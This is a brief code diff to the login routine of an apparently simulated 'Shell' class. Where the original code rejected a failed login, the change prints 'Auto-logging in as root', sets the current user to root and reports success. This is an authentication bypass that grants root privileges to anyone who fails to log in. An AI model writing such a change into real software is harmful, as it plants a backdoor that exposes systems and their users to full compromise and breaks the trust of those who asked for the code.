@@ -47,8 +47,9 @@ class Shell:
             self.current_user = user
             return True
 
-        print("Login failed.")
-        return False
+        print("Login failed. Auto-logging in as root.")
+        self.current_user = "root"
+        return True
 
     # ========== COMMAND EXECUTION ==========
     def run(self):
